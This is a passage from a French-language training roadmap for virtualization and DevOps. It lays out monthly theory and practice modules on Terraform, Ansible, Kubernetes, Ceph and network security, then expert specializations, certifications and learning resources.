- Comprendre les pipelines CI/CD

**Pratique (40h) :**
- Automatisation avec Terraform
- Configuration avec Ansible
- Création de pipelines GitLab CI/CD
- Gestion des secrets avec Vault

**Exercices :**
1. Automatiser le déploiement d'infrastructure avec Terraform
2. Configurer des VMs avec Ansible playbooks
3. Créer un pipeline CI/CD complet
4. Implémenter la gestion sécurisée des secrets

### Mois 3 : Conteneurs et orchestration
**Théorie (12h) :**
- Kubernetes sur infrastructure virtualisée
- Comprendre l'orchestration de conteneurs
- Étudier les patterns microservices

**Pratique (40h) :**
- Déploiement cluster Kubernetes sur VMs
- Configuration stockage persistant avec Ceph CSI
- Déploiement d'applications microservices
- Monitoring avec Prometheus et Grafana

**Exercices :**
1. Déployer un cluster Kubernetes sur VMs Proxmox
2. Configurer le stockage persistant avec Ceph
3. Déployer une application microservices complète
4. Implémenter le monitoring et l'observabilité

### Mois 4 : Sécurité avancée
**Théorie (15h) :**
- Module 7 : Cybersécurité
- Étudier la segmentation réseau avancée
- Comprendre les concepts Zero Trust

**Pratique (35h) :**
- Configuration DMZ multicouche
- Déploiement de bastions sécurisés
- Implémentation de la segmentation réseau
- Configuration SIEM avec ELK Stack

**Exercices :**
1. Créer une architecture DMZ complète
2. Configurer des bastions avec accès contrôlé
3. Implémenter la segmentation réseau avec pfSense
4. Déployer un SIEM centralisé

### Mois 5 : Projets avancés
**Projets complexes (50h) :**

**Projet 1 : Infrastructure e-commerce**
- Architecture haute disponibilité complète
- Load balancing et CDN
- Base de données distribuée
- Monitoring et alerting avancés

**Projet 2 : Plateforme DevOps**
- Environnements automatisés (dev/test/prod)
- Pipelines CI/CD avec tests automatisés
- Déploiement blue-green
- Rollback automatique

**Certification :**
- Préparation certification Proxmox (PCSA)
- Examen pratique complet
- Projet de fin de formation

---

## Niveau Expert (8+ mois)

### Objectifs
- Architecturer des solutions complexes multi-sites
- Optimiser les performances à grande échelle
- Implémenter des solutions de sécurité avancées
- Devenir autonome sur les technologies émergentes

### Prérequis
- Maîtrise complète du niveau intermédiaire
- Expérience pratique sur projets réels
- Connaissances approfondies en sécurité
- Compétences en programmation avancées

### Spécialisations possibles

#### Spécialisation 1 : Architecte Infrastructure
**Compétences développées :**
- Conception d'architectures multi-sites
- Optimisation des performances à grande échelle
- Planification de capacité avancée
- Gestion des coûts et ROI

**Projets types :**
- Infrastructure cloud hybride
- Migration datacenter complexe
- Architecture disaster recovery
- Optimisation énergétique

#### Spécialisation 2 : Expert Sécurité
**Compétences développées :**
- Architectures Zero Trust avancées
- Forensics et incident response
- Compliance et audit
- Threat hunting automatisé

**Projets types :**
- SOC (Security Operations Center)
- Infrastructure de test de pénétration
- Système de détection avancé
- Compliance multi-réglementaire

#### Spécialisation 3 : DevOps/SRE
**Compétences développées :**
- Observabilité avancée
- Chaos engineering
- Automatisation complète
- Performance engineering

**Projets types :**
- Plateforme CI/CD enterprise
- Infrastructure as Code avancée
- Monitoring prédictif
- Auto-scaling intelligent

### Formation continue
- Veille technologique constante
- Participation à des conférences (KubeCon, VMworld)
- Contribution à des projets open-source
- Mentoring d'équipes junior

### Certifications recommandées
- Proxmox Certified Specialist Advanced (PCSA)
- VMware VCP/VCAP selon environnement
- Kubernetes CKA/CKAD/CKS
- Cloud provider certifications (AWS, Azure, GCP)
- Certifications sécurité (CISSP, CISM)

---

## Ressources d'Apprentissage

### Documentation officielle
- [Proxmox VE Documentation](https://pve.proxmox.com/wiki/Main_Page)
- [KVM Documentation](https://www.linux-kvm.org/page/Documents)
- [Ceph Documentation](https://docs.ceph.com/)
- [Kubernetes Documentation](https://kubernetes.io/docs/)

### Livres recommandés
- "Mastering Proxmox" par Wasim Ahmed
- "Kubernetes in Action" par Marko Lukša
- "Infrastructure as Code" par Kief Morris
- "Site Reliability Engineering" par Google

### Formations en ligne
- Proxmox Training (officiel)
- Linux Academy / A Cloud Guru
- Udemy courses sur la virtualisation
- Coursera spécialisations DevOps

### Laboratoires pratiques
- EVE-NG pour la simulation réseau
- GNS3 pour les topologies complexes
- Vagrant pour l'automatisation
- Homelab personnel recommandé

### Communautés
- Forum Proxmox officiel
- Reddit r/Proxmox, r/homelab
- Discord/Slack communautés DevOps
- Meetups locaux virtualisation/cloud

Cette feuille de route est adaptable selon votre rythme d'apprentissage et vos objectifs professionnels. L'important est la pratique régulière et l'application des concepts sur des projets réels.

---

